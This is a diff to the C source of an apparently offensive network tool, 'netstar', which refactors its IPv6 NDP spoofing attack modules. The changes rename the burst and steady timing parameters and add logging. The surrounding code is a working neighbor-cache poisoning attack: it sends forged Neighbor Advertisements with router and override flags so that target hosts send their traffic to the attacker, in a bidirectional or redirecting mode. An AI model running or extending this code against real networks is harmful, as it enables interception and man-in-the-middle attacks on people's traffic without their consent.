@@ -9,6 +9,7 @@
 #include <netstar-scanner.h>
 #include <netstar-recon.h>
 
+#include <inttypes.h>
 #include <stdlib.h>
 
 
@@ -26,6 +27,17 @@ netstar_ndp_network_spoofing(void *context) {
 
   netstar_timer_t timer = NETSTAR_TIMER_INITIALIZER;
 
+  netstar_log(
+    "\b \b[ ndp@network-spoofing ]: network-scan-interval: %" PRIu32 "s; "
+                                   "spoof-burst-interval: %" PRIu32 "s; "
+                                   "spoof-burst-count: %zu; "
+                                   "spoof-steady-interval: %" PRIu32 "\r\n",
+    netstar_time_millisecstosecs(spoofing_attack->network_scan_interval),
+    netstar_time_millisecstosecs(spoofing_attack->spoof_burst_interval),
+    spoofing_attack->spoof_burst_count,
+    netstar_time_millisecstosecs(spoofing_attack->spoof_steady_interval)
+  );
+
   netstar_recon_hosts6(netstar, spoofing_attack->spoofed_hosts);
 
   if (spoofing_attack->redirective)
@@ -34,9 +46,7 @@ netstar_ndp_network_spoofing(void *context) {
   netstar_log("\b \b[ ndp@network-spoofing ] initializing host reconnaissances on the network\r\n");
 
   while (thread->status && netstar_hosts_size(netstar_scanner_scanned_hosts6) < 2) {
-    netstar_thread_sleep(thread, 4);
- // netstar_time_sleep(spoofing_attack->persistent_time); // +3500; 
- // netstar_time_sleep(netstar_time_secstomillisecs(1));
+    netstar_time_sleep(spoofing_attack->spoof_steady_interval);
     continue;
   }
 
@@ -82,32 +92,46 @@ netstar_ndp_network_spoofing(void *context) {
             source_mac = spoofing_attack->redirection_host.mac;
           }
 
-          if (!spoofing_attack->shockwaves && !spoofing_attack->redirective)
+          if (!spoofing_attack->spoof_burst_count && !spoofing_attack->redirective)
             netstar_sendicmpv6echo(&netstar->managed, &netstar->managed.iface->mac, &target_host->mac, NETSTAR_ICMPV6_TYPE_ECHO, &spoofed_host->addr.v6, &target_host->addr.v6);
 
           netstar_sendndpadvert(&netstar->managed, &netstar->managed.iface->mac, &target_host->mac, NETSTAR_NDP_TYPE_NEIGHBOR_ADVERT, NETSTAR_NDP_ADVERT_FLAG_ROUTER|NETSTAR_NDP_ADVERT_FLAG_SOLICITED|NETSTAR_NDP_ADVERT_FLAG_OVERRIDE, &spoofed_host->addr.v6, &target_host->addr.v6, &source_mac);
 
           if (spoofing_attack->bidirectional) {
-            if (!spoofing_attack->shockwaves && !spoofing_attack->redirective)
+            if (!spoofing_attack->spoof_burst_count && !spoofing_attack->redirective)
               netstar_sendicmpv6echo(&netstar->managed, &netstar->managed.iface->mac, &spoofed_host->mac, NETSTAR_ICMPV6_TYPE_ECHO, &target_host->addr.v6, &spoofed_host->addr.v6);
 
             netstar_sendndpadvert(&netstar->managed, &netstar->managed.iface->mac, &spoofed_host->mac, NETSTAR_NDP_TYPE_NEIGHBOR_ADVERT, NETSTAR_NDP_ADVERT_FLAG_ROUTER|NETSTAR_NDP_ADVERT_FLAG_SOLICITED|NETSTAR_NDP_ADVERT_FLAG_OVERRIDE, &target_host->addr.v6, &spoofed_host->addr.v6, &source_mac);
           }
 
+#ifdef NETSTAR_DEBUG
+          {
+            char saddr[NETWORK_IPADDR6_STRLENGTH] = {0}, daddr[NETWORK_IPADDR6_STRLENGTH] = {0};
+
+            network_ipaddr6_format(&spoofed_host->addr.v6, saddr, sizeof(saddr));
+            network_ipaddr6_format(&target_host->addr.v6, daddr, sizeof(daddr));
+
+            netstar_log("\b \b[ ndp@spoofing ] %s %s NDP Neighbor Advertisement (0x%02" PRIX8 ") %s spoofing %s %s\r\n",
+              saddr, netstar_vendors_namebymac(&spoofed_host->mac),
+              NETSTAR_NDP_TYPE_NEIGHBOR_ADVERT,
+              ((spoofing_attack->bidirectional) ? "bidirectional" : "directional"),
+              netstar_vendors_namebymac(&target_host->mac), daddr
+            );
+          }
+#endif
           netstar_time_sleep(20);
         }
       }
 
-      if (spoofing_attack->shockwaves) {
-        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->shockwave_time));
-        spoofing_attack->shockwaves--;
+      if (spoofing_attack->spoof_burst_count) {
+        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->spoof_burst_interval));
+        spoofing_attack->spoof_burst_count--;
       } else {
-        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->persistent_time));
+        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->spoof_steady_interval));
       }
     }
 
-    netstar_thread_sleep(thread, 4);
- // netstar_time_sleep(netstar_time_secstomillisecs(1));
+    netstar_time_sleep(netstar_time_secstomillisecs(2));
   }
 
   netstar_thread_exit(thread, NULL);
@@ -122,10 +146,10 @@ netstar_ndp_network_spoofing_new(struct netstar_ndp_network_spoofing *spoofing_a
   if (!(spoofing_attack->protected_hosts = netstar_hosts_new()))
     goto _return;
 
-  spoofing_attack->shockwave_time  = ((spoofing_attack->shockwave_time) ?: 1000);
-  spoofing_attack->shockwaves      = 10;
+  spoofing_attack->spoof_burst_interval  = ((spoofing_attack->spoof_burst_interval) ?: netstar_time_secstomillisecs(1));
+  spoofing_attack->spoof_burst_count      = 10;
 
-  spoofing_attack->persistent_time = ((spoofing_attack->persistent_time) ?: 10000);
+  spoofing_attack->spoof_steady_interval = ((spoofing_attack->spoof_steady_interval) ?: netstar_time_secstomillisecs(4));
 
   spoofing_attack->netstar = netstar;
 
@@ -168,7 +192,6 @@ netstar_ndp_network_spoofing_start(void *context) {
   struct netstar_ndp_network_spoofing *spoofing_attack = (struct netstar_ndp_network_spoofing *)context;
 
   spoofing_attack->thread = netstar_thread_spawn(netstar_ndp_network_spoofing, spoofing_attack);
-  // netstar_forward_add(netstar_ndp_spoofing, NETSTAR_FORWARD_NDP);
 }
 
 void
@@ -205,6 +228,14 @@ netstar_ndp_spoofing(void *context) {
 
   netstar_timer_t timer = NETSTAR_TIMER_INITIALIZER;
 
+  netstar_log("\b \b[ ndp@spoofing ]: spoof-burst-interval: %" PRIu32 "s; "
+                                     "spoof-burst-count: %zu; "
+                                     "spoof-steady-interval: %" PRIu32 "\r\n",
+    netstar_time_millisecstosecs(spoofing_attack->spoof_burst_interval),
+    spoofing_attack->spoof_burst_count,
+    netstar_time_millisecstosecs(spoofing_attack->spoof_steady_interval)
+  );
+
   if (spoofing_attack->redirective) {
     netstar_log("\b \b[ ndp@spoofing ] running on redirectional mode\r\n");
     netstar_recon_host6(netstar, &spoofing_attack->redirection_host);
@@ -235,32 +266,46 @@ netstar_ndp_spoofing(void *context) {
             source_mac = spoofing_attack->redirection_host.mac;
           }
 
-          if (!spoofing_attack->shockwaves && !spoofing_attack->redirective)
+          if (!spoofing_attack->spoof_burst_count && !spoofing_attack->redirective)
             netstar_sendicmpv6echo(&netstar->managed, &netstar->managed.iface->mac, &target_host->mac, NETSTAR_ICMPV6_TYPE_ECHO, &spoofed_host->addr.v6, &target_host->addr.v6);
 
           netstar_sendndpadvert(&netstar->managed, &netstar->managed.iface->mac, &target_host->mac, NETSTAR_NDP_TYPE_NEIGHBOR_ADVERT, NETSTAR_NDP_ADVERT_FLAG_ROUTER|NETSTAR_NDP_ADVERT_FLAG_SOLICITED|NETSTAR_NDP_ADVERT_FLAG_OVERRIDE, &spoofed_host->addr.v6, &target_host->addr.v6, &source_mac);
 
           if (spoofing_attack->bidirectional) {
-            if (!spoofing_attack->shockwaves && !spoofing_attack->redirective)
+            if (!spoofing_attack->spoof_burst_count && !spoofing_attack->redirective)
               netstar_sendicmpv6echo(&netstar->managed, &netstar->managed.iface->mac, &spoofed_host->mac, NETSTAR_ICMPV6_TYPE_ECHO, &target_host->addr.v6, &spoofed_host->addr.v6);
 
             netstar_sendndpadvert(&netstar->managed, &netstar->managed.iface->mac, &spoofed_host->mac, NETSTAR_NDP_TYPE_NEIGHBOR_ADVERT, NETSTAR_NDP_ADVERT_FLAG_ROUTER|NETSTAR_NDP_ADVERT_FLAG_SOLICITED|NETSTAR_NDP_ADVERT_FLAG_OVERRIDE, &target_host->addr.v6, &spoofed_host->addr.v6, &source_mac);
           }
 
+#ifdef NETSTAR_DEBUG
+          {
+            char saddr[NETWORK_IPADDR6_STRLENGTH] = {0}, daddr[NETWORK_IPADDR6_STRLENGTH] = {0};
+
+            network_ipaddr6_format(&spoofed_host->addr.v6, saddr, sizeof(saddr));
+            network_ipaddr6_format(&target_host->addr.v6, daddr, sizeof(daddr));
+
+            netstar_log("\b \b[ ndp@spoofing ] %s %s NDP Neighbor Advertisement (0x%02" PRIX8 ") %s spoofing %s %s\r\n",
+              saddr, netstar_vendors_namebymac(&spoofed_host->mac),
+              NETSTAR_NDP_TYPE_NEIGHBOR_ADVERT,
+              ((spoofing_attack->bidirectional) ? "bidirectional" : "directional"),
+              netstar_vendors_namebymac(&target_host->mac), daddr
+            );
+          }
+#endif
           netstar_time_sleep(20);
         }
       }
 
-      if (spoofing_attack->shockwaves) {
-        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->shockwave_time));
-        spoofing_attack->shockwaves--;
+      if (spoofing_attack->spoof_burst_count) {
+        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->spoof_burst_interval));
+        spoofing_attack->spoof_burst_count--;
       } else {
-        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->persistent_time));
+        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->spoof_steady_interval));
       }
     }
 
-    netstar_thread_sleep(thread, 4);
- // netstar_time_sleep(netstar_time_secstomillisecs(1));
+    netstar_time_sleep(netstar_time_secstomillisecs(2));
   }
 
   netstar_thread_exit(thread, NULL);
@@ -274,10 +319,10 @@ netstar_ndp_spoofing_new(struct netstar_ndp_spoofing *spoofing_attack, netstar_t
   if (!(spoofing_attack->target_hosts = netstar_hosts_new()))
     goto _return;
 
-  spoofing_attack->shockwave_time  = ((spoofing_attack->shockwave_time) ?: 1000);
-  spoofing_attack->shockwaves      = 10;
+  spoofing_attack->spoof_burst_interval  = ((spoofing_attack->spoof_burst_interval) ?: netstar_time_secstomillisecs(1));
+  spoofing_attack->spoof_burst_count      = 10;
 
-  spoofing_attack->persistent_time = ((spoofing_attack->persistent_time) ?: 10000);
+  spoofing_attack->spoof_steady_interval = ((spoofing_attack->spoof_steady_interval) ?: netstar_time_secstomillisecs(4));
 
   spoofing_attack->netstar = netstar;
 
@@ -321,7 +366,6 @@ netstar_ndp_spoofing_start(void *context) {
   struct netstar_ndp_spoofing *spoofing_attack = (struct netstar_ndp_spoofing *)context;
 
   spoofing_attack->thread = netstar_thread_spawn(netstar_ndp_spoofing, spoofing_attack);
-  // netstar_forward_add(netstar_ndp_spoofing, NETSTAR_FORWARD_NDP);
 }
 
 static void
